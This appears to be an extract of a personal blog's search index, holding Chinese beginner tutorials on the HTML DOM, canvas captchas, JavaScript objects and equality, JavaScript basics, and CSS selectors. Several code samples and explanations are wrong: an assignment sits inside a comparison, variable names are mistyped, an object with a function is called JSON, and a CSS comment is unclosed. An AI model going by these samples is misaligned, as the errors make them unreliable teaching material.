属性来访问。</p></blockquote></li></ul><br>## HTML DOM 对象- **[Document 对象](http://www.w3school.com.cn/jsref/dom_obj_document.asp)**每个载入浏览器的 HTML 文档都会成为 Document 对象。Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。&gt;Document 对象是 Window 对象的一部分，可通过 `window.document` 属性对其进行访问。- **[Element 对象](http://www.w3school.com.cn/jsref/dom_obj_all.asp)**在 HTML DOM 中，Element 对象表示 HTML 元素。Element 对象可以拥有类型为元素节点、文本节点、注释节点的子节点。NodeList 对象表示节点列表，比如 HTML 元素的子节点集合。元素也可以拥有属性。属性(Attribute)是属性节点。&gt;在 HTML DOM （文档对象模型）中，每个部分都是 **DOM 节点**：    - 文档本身是文档节点    - 所有 HTML 元素是元素节点    - 所有 HTML 属性是属性节点    - HTML 元素内的文本是文本节点    - 注释是注释节点- **[Attribute 对象](http://www.w3school.com.cn/jsref/dom_obj_attributes.asp)**    - Attr 对象    在 HTML DOM 中，**Attr** 对象表示 HTML 属性。    HTML 属性始终属于 HTML 元素。    - NamedNodeMap 对象    在 HTML DOM 中，**NamedNodeMap** 对象表示元素属性节点的无序集合。    NamedNodeMap 中的节点可通过名称或索引（数字）来访问。- **[Event 对象](http://www.w3school.com.cn/jsref/dom_obj_event.asp)**Event 对象代表事件的状态，比如事件在其中发生的元素、键盘按键的状态、鼠标的位置、鼠标按钮的状态。事件通常与函数结合使用，函数不会在事件发生前被执行！]]></content>
      
      
      <categories>
          
          <category> Web 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BOM </tag>
            
            <tag> DOM </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 验证码的实现</title>
      <link href="/2017/04/14/javascriptverificationcode/"/>
      <url>/2017/04/14/javascriptverificationcode/</url>
      
        <content type="html"><![CDATA[<p>最近想给自己的网站做个注册页面，就发现需要个验证码来防止机器注册。</p><span id="more"></span><p>下面是核心方法介绍</p><h2 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h2><p>更具体的可以参看 <a href="http://www.w3school.com.cn/tags/html_ref_canvas.asp">HTML 5 Canvas 参考手册</a> </p><h3 id="获取或创建-canvas-元素（HTML-标签）"><a href="#获取或创建-canvas-元素（HTML-标签）" class="headerlink" title="获取或创建 canvas 元素（HTML 标签）"></a>获取或创建 canvas 元素（HTML 标签）</h3><ul><li>获取 HTML 上的 canvas 标签<br>HTML 代码：<pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;canvas id="myCanvas" width="200" height="100"&gt;&lt;/canvas&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>JS 代码：<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">canvas = document.getElementById("myCanvas");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>临时创建一个 canvas 元素<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">canvas = document.createElement('canvas')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><br>### 创建 CanvasRenderingContext2D 对象**语法**<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">Canvas.getContext(contextID)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>**参数**contextID 指定了您想要在画布上绘制的类型。当前唯一的合法值是 "2d"，它指定了二维绘图，并且导致这个方法返回一个环境对象，该对象导出一个二维绘图 API。&gt;不过当前只支持 "2D" 参数，可能是为了以后扩展三维绘图做准备吧，哈哈<p><strong>返回值</strong><br>一个 CanvasRenderingContext2D 对象，使用它可以绘制到 Canvas 元素中。</p><h3 id="设置-CanvasRenderingContext2D-对象属性"><a href="#设置-CanvasRenderingContext2D-对象属性" class="headerlink" title="设置 CanvasRenderingContext2D 对象属性"></a>设置 CanvasRenderingContext2D 对象属性</h3><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">ctx.fillStyle = '#f3fbfe';//背景色ctx.fillRect(矩形左上角 x 坐标, 矩形左上角 y 坐标, 矩形右下角 x 坐标, 矩形右下角 y 坐标);//设置矩形ctx.globalAlpha = .8;//设置透明度ctx.font = '16px sans-serif';//设置字体和字体大小<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 验证码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 面向对象</title>
      <link href="/2017/04/13/javascriptoop/"/>
      <url>/2017/04/13/javascriptoop/</url>
      
        <content type="html"><![CDATA[<p>JavaScript 中的面向对象与 Java 中的面向对象类似，JavaScript 中的原型对象 和 Java 中的类是一个概念。</p><span id="more"></span><h2 id="原型对象"><a href="#原型对象" class="headerlink" title="原型对象"></a>原型对象</h2><h3 id="定义原型对象："><a href="#定义原型对象：" class="headerlink" title="定义原型对象："></a>定义原型对象：</h3><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">function 原型对象名(){ 方法;属性;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>定义原型对象看起来和定义方法很想，所以为了方便区分，习惯上将对象名首字母大写，方法名首字母小写。</p></blockquote><h3 id="创建原型对象与-Java-一样，使用-new-关键字创建原型对象"><a href="#创建原型对象与-Java-一样，使用-new-关键字创建原型对象" class="headerlink" title="创建原型对象与 Java 一样，使用 new 关键字创建原型对象"></a>创建原型对象与 Java 一样，使用 new 关键字创建原型对象</h3><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var 对象名 = new 原型对象名();var a = new Person();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="设置对象属性："><a href="#设置对象属性：" class="headerlink" title="设置对象属性："></a>设置对象属性：</h3><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">对象名.属性名 = 属性值;a.name = "张三";a.age = 10;a.sex = "M";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="设置方法："><a href="#设置方法：" class="headerlink" title="设置方法："></a>设置方法：</h3><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">a.say = function() {alert(a.name + "," + a.age + "," + a.sex); }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="调用对象的方法："><a href="#调用对象的方法：" class="headerlink" title="调用对象的方法："></a>调用对象的方法：</h3><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">a.say();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>## JavaScript 原型对象的公有属性，私有属性，静态属性### 公有属性公有属性、方法可以在类的外部访问，使用 `this.XXX` 定义的属性和方法为公有,`XXX` 为属性名或方法名：<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">function Person() {this.name = "张三";//公有属性this.age = 10;//公有属性this.show = function() {//公有方法console.log("name:" + this.name + ", age:" + this.age);}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>&gt;**值得一提的是，类的公有属性在类的内部调用时，也需要使用 `this.属性名`。**<br>### 私有属性私有属性、方法只能在类的内部访问，使用 `var XXX` 定义的属性和方法为私有,`XXX` 为属性名或方法名：<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">function Person() {var name = "张三";//私有属性var age = 10;//私有属性var show = function() {//私有方法console.log("name:" + name + ", age:" + age);}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>&gt;私有属性在访问时直接使用属性名即可<br>### 静态属性使用 `类名.XXX` 定义的属性和方法为静态属性或静态方法,`XXX` 为属性名或方法名：<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">function Person() {Person.name = "张三";//私有属性Person.age = 10;//私有属性Person.show = function() {//私有方法console.log("name:" + Person.name + ", age:" + Person.age);}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>&gt;与 Java 一样，静态属性和方法不属于任何具体的对象，只能通过 `类名.XXX` 来调用。&gt;与 公有属性类似，即使是类的内部也需要使用 `类名.XXX` 来调用。<br>## 原型对象 prototype 属性1. 用于扩展当前原型对象的方法和属性，扩展的方法和属性是每个具体对象中都有的。2. 用于重写当前原型对象的方法和属性。<p>假设 Dog 对象已经给定了，无法修改：</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">function Dog(name, sex){this.name = name;this.sex = sex;this.eat = function() {alert("一只" + sex + "狗" + this.name + "正在啃骨头！");}}var dog1 = new Dog("旺旺","公");dog1.eat();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时若想添加一个 bark 方法，就可以使用 <code>类名.prototype.XXX</code> 给 Dog 类添加属性或方法，这些属性和方法在每个 Dog 具体对象中都可以调用。</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">Dog.prototype.bark = function() {alert("它正在狂吠");}dog1.bark();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>使用 prototype 也可以重写原型对象中的方法和系统提供的方法。</p></blockquote><br>## JavaScript 对象 与 JSON 对象### 对象的创建方式- [使用 `new 原型对象()` 创建原型对象]()- 非原型对象也可以直接创建<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var p2 = {name: "李四",age: 10,classroom:{classId: 1,className: "小葵花班"},score: [100, 20, 40],eat: function() {console.log("吃了一天包子。");}};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>&gt;该对象是单独的一个对象，没有原型模板，不是原型对象。<h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p>JSON 是一个特殊的 JavaScript 对象，常用的传输数据格式。<br>其格式为 js 普通对象的属性名全部添加 “” 后的样子</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var p2Json = {"name": "李四","age": 10,"classroom":{"classId": 1,"className": "小葵花班"},"score": [100, 20, 40],"eat": function() {console.log("吃了一天包子。");}};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用 JSON 对象方式与 JavaScript 对象一样</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">alert(p2.name);alert(p2Json.name());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="JSON-对象转换为-JavaScript-对象"><a href="#JSON-对象转换为-JavaScript-对象" class="headerlink" title="JSON 对象转换为 JavaScript 对象"></a>JSON 对象转换为 JavaScript 对象</h3><p>在传递数据的时候一般将 JSON 对象转换成字符串。<br>使用 <code>JSON.stringify()</code> 方法可以将 JS 对象或者 JSON 对象转换成 JSON 字符串。</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var p2JsonStr = JSON.stringify(p2Json);alert(p2JsonStr);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>若想将 JSON 对象转换为 JavaScript 对象，则需要先将 JSON 对象转换为字符串</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var p2New = JSON.parse(p2JsonStr);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>## JavaScript 面向对象的特征（封装、继承和多肽）### 封装<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">function Person(n,a) {var name = n;//私有属性var age = a;//私有属性this.show = function() {//公有方法console.log("name:" + name + ", age:" + age);}this.setName = function(v) {name = v;}this.setAge = function(a) {age = a;}this.getName = function() {return name;}this.getAge = function() {return age;}}var p1 = new Person("lucy",10);alert(p1.getAge);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>&gt;与 Java 不同，这里的参数名不可和私有属性同名。<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">function Student(n,a) {this.person = Person;//继承 Personthis.person(n,a);this.eat = function() {console.log("吃饭");}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>向上转型：父类引用执行不同的子类对象，调用相同的方法，结果不同。<br>同一个引用指向不同的对象，表现的行为方式不同</p><br>## JavaScript 内置对象- [Array](http://www.w3school.com.cn/jsref/jsref_obj_array.asp)- [Date](http://www.w3school.com.cn/jsref/jsref_obj_date.asp)- [Math](http://www.w3school.com.cn/jsref/jsref_obj_math.asp)- [Number](http://www.w3school.com.cn/jsref/jsref_obj_number.asp)- [String](http://www.w3school.com.cn/jsref/jsref_obj_string.asp)- [Functions](http://www.w3school.com.cn/jsref/jsref_obj_global.asp)<p>更多内置对象可参考 <a href="www.w3school.com.cn">w3cschool</a> 上的<a href="http://www.w3school.com.cn/jsref/index.asp">《JavaScript 对象参考手册》</a></p>]]></content>
      
      
      <categories>
          
          <category> Web 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 面向对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 中的 == 与 ===</title>
      <link href="/2017/04/12/javascript-and/"/>
      <url>/2017/04/12/javascript-and/</url>
      
        <content type="html"><![CDATA[<p><code>===</code> 叫做严格相等运算符，<code>==</code> 叫做不严格相等运算符。两者的区别网上随处可见，总结下答案无外乎就是：</p><blockquote><p>双等号会造成类型转换，推荐一律使用三等号。</p></blockquote><span id="more"></span><h2 id="与-的运算规则"><a href="#与-的运算规则" class="headerlink" title="== 与 === 的运算规则"></a><code>==</code> 与 <code>===</code> 的运算规则</h2><h3 id=""><a href="#" class="headerlink" title="==="></a><code>===</code></h3><ol><li>不同类型值<br>如果两个值的类型不同，直接返回 false。</li><li>同一类的原始类型值<br>同一类型的原始类型的值（数值、字符串、布尔值）比较时，值相同就返回 true，值不同就返回 false。</li><li>同一类的复合类型值<br>两个复合类型（对象、数组、函数）的数据比较时，不是比较它们的值是否相等，而是比较它们是否指向同一个对象。</li><li>undefined 和 null<br>undefined 和 null 与自身严格相等。<br>null === null  //true<br>undefined === undefined  //true</li></ol><h3 id="-1"><a href="#-1" class="headerlink" title="=="></a><code>==</code></h3><ol><li><code>==</code> 在比较相同类型的数据时，与 <code>===</code> 完全一样；</li><li>在比较不同类型的数据时，<code>==</code> 会先将数据进行类型转换，然后再用 <code>===</code> 比较。</li></ol><h4 id="进行类型转换规则："><a href="#进行类型转换规则：" class="headerlink" title="== 进行类型转换规则："></a><code>==</code> 进行类型转换规则：</h4><ol><li>原始类型的值<br>原始类型的数据会转换成数值类型再进行比较。字符串和布尔值都会转换成数值，所以题主的问题中会有第二个 string 输出。</li><li>对象与原始类型值比较<br>对象（这里指广义的对象，包括数值和函数）与原始类型的值比较时，对象转化成原始类型的值，再进行比较。</li><li>undefined 和 null<br>undefined 和 null 与其他类型的值比较时，结果都为 false，它们互相比较时结果为 true。</li></ol><br>## 为何不建议使用 `==`### 使用 `==` 会导致代码意图混乱`==` 带来的便利性抵不上其带来的成本,举个简单的例子：团队协作中你肯定需要读别人的代码。而当你看到 `==` 时，要判断清楚作者的代码意图是确实需要转型，还是无所谓要不要转型只是随手写了，还是不应该转型但是写错了……所花费的脑力和时间要比明确的使用`===`(加上可能需要的明确转型)要多得多。要记得团队中的每个人（包括原作者自己）都需要付出这种理解和维护成本。<br>### `==` 隐藏的类型转换，会带来一些违反直觉的结果。'' == '0'           // false0 == ''             // true0 == '0'            // true<p>false == ‘false’    // false<br>false == ‘0’        // true</p><p>false == undefined  // false<br>false == null       // false<br>null == undefined   // true</p><p>‘ \t\r\n ‘ == 0     // true</p><h3 id="可能会带来意外的副作用"><a href="#可能会带来意外的副作用" class="headerlink" title="== 可能会带来意外的副作用"></a><code>==</code> 可能会带来意外的副作用</h3><p>代码示例：</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var x = 1;var obj = {valueOf: function(){ x = 2; return 0 }}console.log(obj == 0, x) // true, 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>甚至还会产生异常</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var x = 1;var obj = {valueOf: function(){ return {} }, toString: function(){ return {}}}console.log(obj == 0) // Error: Cannot convert object to primitive value<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>## 附：用 `==` 与 `==` 判断各类型数据的结果表下图是 `==` 判断各类型数据的结果集，橙色部分：判断结果为 true：![==](http://wx3.sinaimg.cn/mw690/a6e9cb00ly1fejyghnijlj20go0gl76u.jpg)<br>下图是 `===` 判断各类型数据的结果集，橙色部分：判断结果为 true：![===](http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fejyfxkvlqj20go0glq5q.jpg)<br>下图是更完整的判断各类型数据的结果集- 红色：`===` 判断结果为 true;- 橙色：`==` 判断结果为 true;- 黄色：`&lt;=` 和 `&gt;=` 判断结果都为 true，但是 `==` 的判断结果为 false;- 蓝色：只有 `&gt;=` 的判断结果为 true;- 绿色：只有 `&lt;=` 的判断结果为 true; <p><img src="http://wx3.sinaimg.cn/mw690/a6e9cb00ly1fejyfug2wlj20go0gnade.jpg" alt="===、==、>=和<="></p><br>**本文整理自[知乎](https://www.zhihu.com/question/31442029)上各位大神的回答。**]]></content>
      
      
      <categories>
          
          <category> Web 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 等于 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript</title>
      <link href="/2017/04/12/javascript/"/>
      <url>/2017/04/12/javascript/</url>
      
        <content type="html"><![CDATA[<p>JavaScript 简称 js，JavaScript 语言与 Java 语言没关系。JavaScript 是用来做网页动态效果的。JavaScript 分为三个模块：ECMAScript(European Computer Manufacture Assosiation)、DOM(Document Object Model)和 BOM（Browser Object Model）。</p><span id="more"></span><p>ECMAScript：欧洲制造商协会，定义了基本语法、变量、循环等<br>DOM：文档对象模型<br>BOM：浏览器对象模型</p><h2 id="JavaScript-特点"><a href="#JavaScript-特点" class="headerlink" title="JavaScript 特点"></a>JavaScript 特点</h2><ol><li>js 是一个弱类型语言：变量类型不需要指定，不会出现编译错误，变量类型可以动态修改。</li><li>js 是一个脚本语言：不能单独运行，必须以来一个载体(html)。</li><li>js 是一个面向对象的语言</li></ol><br>## JavaScript 应用场景1. 网页数据验证2. 地图3. 某些网页游戏<br>## JavaScript 引入方式- 嵌入式：使用下面的代码即可，此方式可以放在任意位置。<pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;script type="text/javascript"&gt;JavaScript 脚本代码&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>- 链接式：引入外部文件,也可以放在任意位置。<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">&lt;script type="text/javascript" src="外部 js 路径"&gt;&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>## JavaScript 基本语法### JavaScript 变量JavaScript 变量的两种声明方式：1. `var num = 10;`2. `num = "abc";` 这里将 num 变量类型从 number 类型变为了 string 类型。<p><strong>注意：</strong>JavaScript 中变量类型不需要指定，变量的类型是在赋值之后确定。<strong>变量类型可以 typeof 函数查看</strong>，并且变量类型可以动态改变。</p><h4 id="JavaScript-变量类型："><a href="#JavaScript-变量类型：" class="headerlink" title="JavaScript 变量类型："></a>JavaScript 变量类型：</h4><p>基本数据类型：数值类型（小数和整数），字符串类型，逻辑数据类型</p><p>|基本数据类型|<br>|:–:|:–:|:–:|<br>|number|数值类型(小数和整数)|<code>var a = 10;</code>|<br>|string|字符串类型|<code>var b = "abc";</code>|<br>|boolean|逻辑数据类型|<code>var c = true;</code>|<br>|<strong>引用数据类型</strong>|<br>|array|数组|<code>var d = [1,"abc", false, 2.2];</code>|<br>|object|对象|``|</p><h4 id="JavaScript-类型转换"><a href="#JavaScript-类型转换" class="headerlink" title="JavaScript 类型转换"></a>JavaScript 类型转换</h4><ol><li>自动转换：重新赋值<pre class="line-numbers language-none"><code class="language-none">var num = 10;num = "abc";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>手动转换：使用 parseXXX(变量) 方法转换变量的数据类型为 XXX 类型。<pre class="line-numbers language-none"><code class="language-none">var a = 10;var b = "22.20";var c = "20";//计算 a + b + c 的值var s = a + parseFloat(b) + parseInt(c);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="JavaScript-中两个特殊的值"><a href="#JavaScript-中两个特殊的值" class="headerlink" title="JavaScript 中两个特殊的值"></a>JavaScript 中两个特殊的值</h4><ul><li><strong>非零数值除以 0 会得到 Infinity(无限的)。</strong><br><code>isFinite(变量)</code> 判断当前变量是否是有限的。</li><li><strong>数值除以非数值会得到 NaN。</strong><br><code>isNaN(变量)</code> 可以判断当前变量是否为 NaN，<strong>Infinity 是个数字</strong>。</li></ul><br>## JavaScript 运算符|类别|运算符||:--:|:--:||赋值运算符|=||自增|++、--||算数运算符|+、-、*、/、%||三目运算符|boolean?值 1:值 2||逻辑运算符|&amp;&amp;(短路与)、丨丨(短路或)、!(非)、&amp;、丨||比较运算符|&gt;、&lt;、&gt;=、&lt;=、==、!=、===|<p><code>&amp;&amp;</code>、<code>||</code> 和 <code>!</code> 代码示例：</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">age = 18;sex = "男";isBoy = age&lt;18 &amp;&amp; sex = "男";isGirl = age &lt; 18 &amp;&amp; sex = "女";isKid = isBoy || isGirl;notKid = !isKid;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>==：不严格相等，值相等就返回 true<br>===：严格相等，数值和类型都相等才返回 true<br>if (这里可以不是 boolean 值)，如果非 boolean 类型的值则只有 NaN null 0 才会返回 false<br>关于 <code>==</code> 和 <code>===</code> 更详细的区别请看[《JavaScript 中的 <code>==</code> 与 <code>===</code>》](/2017/04/12/JavaScript 中的==与===/)。</p></blockquote><br>## JavaScript 流程控制### 选择结构：- if ... else ...- switch ... case ...<h3 id="循环结构："><a href="#循环结构：" class="headerlink" title="循环结构："></a>循环结构：</h3><ul><li>while … </li><li>do … while …</li><li>for …</li></ul><blockquote><p>JavaScript 中的 for 循环与 Java 类似，也有一种增强佛循环：</p></blockquote><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">`for (var 下标 in 数组) {alsert(数组[下标]);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：<br>Java 中的增强 for 循环中定义的变量表示的是数组中的每个元素；<br>而 JavaScript 中的增强 for 循环中定义的变量表示的是数组中的下标。</p></blockquote><br>## JavaScript 中的函数### 定义函数1. function 方法名(){    方法体}2. var 方法名 = function(){    方法体} <h3 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h3><ol><li>方法名();</li><li>var abc = 方法名; abc();</li></ol><blockquote><p>JavaScript 中不支持方法重载，后面的方法如果和前面的方法名相同，则会覆盖前面的方法名<br>JavaScript 天然支持方法重载，JavaScript 中方法的参数可以任意传递，通过封装对象 arguments 获取传递的参数</p></blockquote><br>## JavaScript 数组JavaScript 中的数组是不定长的，且元素可以是任意类型。定义数组 var arr = [12, "34", 5.6, false];数组长度 arr.length遍历数组<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">for (var key in arr) {//key 为下标arr[key];}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>下标 key 也可以不是数字### 数组动态赋值为指定下标赋值：<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">arr[下标] = 值;arr["sh"] = "上海";arr["bj"] = "北京";for (var key in arr) {//key 为下标alert(key + ": " + arr[key]);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### 二维数组二维数组的声明与遍历：<pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var citys = new Array();cittys["bj"] = ["昌平", "宣武", "丰台"];cittys["sh"] = ["浦东", "虹桥", "崇明岛"];for (var key in citys) {for (var i = 0; i &lt; citys[key].length; i++) {alert(citys[key][i];}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p>根据获取 HTML 页面元素 <code>document.getElementByXXX()</code></p>]]></content>
      
      
      <categories>
          
          <category> Web 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DIV + CSS</title>
      <link href="/2017/04/11/css-div/"/>
      <url>/2017/04/11/css-div/</url>
      
        <content type="html"><![CDATA[<p>CSS(Casading Style Sheet) → 层叠样式表，用来美化网页。<br>DIV(DIVision) → DIV 是层叠样式表中的定位技术。</p><span id="more"></span><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><h3 id="CSS-的声明和注释"><a href="#CSS-的声明和注释" class="headerlink" title="CSS 的声明和注释"></a>CSS 的声明和注释</h3><p>对指定标签做修饰</p><pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">选择器{声明}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>CSS 中只有一种注释方式：</p><pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">/*这里写注释*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>### 选择器选择器选中某个或多个特定的标签。#### 基本选择器**id 选择器：**在标签中加入 id 属性 `id="id 名称"`<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">#id 名称{样式声明}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>标签选择器：</strong></p><pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">标签名{样式声明}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>类选择器：</strong>在标签上加入 class 属性 <code>class="类名"</code></p><pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">.类名{样式声明}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>属性选择器</strong>在标签中加入 name 属性</p><pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">[name]{样式声明}[name="属性值"]{样式声明}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>全局选择器:</strong></p><pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">*{样式声明}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>#### 复合选择器- 交集选择器：同时达到多个选择器条件的选择器。标签名必须在最前，后面可添加其他[基本选择器](/2017/04/11/CSS+DIV/#基本选择器)<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">标签名.类名#id 名{样式声明}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>- 并集选择器：一次性定义多个选择器，每个选择器都应用该样式，多个选择器之间用英文逗号隔开，没有顺序<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">.类名,标签名,id 名{样式声明}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>- 后台选择器：定义父选择器中的子选择器样式，父选择器不受影响，严格的顺序，用空格隔开，例如定义标签 c 的样式如下：<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">a 标签 a 的子标签 b b 的子标签 c {样式声明}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>#### 选择器优先级1. id 选择器2. 属性选择器、类选择器3. 标签选择器4. 全局选择器<blockquote><p>同优先级的选择器，后面的覆盖前面的</p></blockquote><p> 打完收工，然后扬眉吐气 我觉着没错，但是那些频繁收工频繁扬眉频繁吐气的人是什么情况？<br><br></p><h3 id="CSS-特性"><a href="#CSS-特性" class="headerlink" title="CSS 特性"></a>CSS 特性</h3><ul><li>继承性：子标签若没有定义样式，则会继承父标签的样式</li><li>层叠性：样式不冲突的前提下，所有选择器添加的样式都会展现</li></ul><br>### 常用属性<pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">div{color: purple;/*字体颜色*/width: 200px;/*宽度height: 200px;/*高度background-image: url(img/img1.jpg);/*背景图片*/background-color: yellow;/*背景颜色*/font-size: 30px;/*字体大小*/font-family: 宋体;/*字体*/font-style: italic;/*倾斜*/font-weight: bold;/*加粗*/cursor: 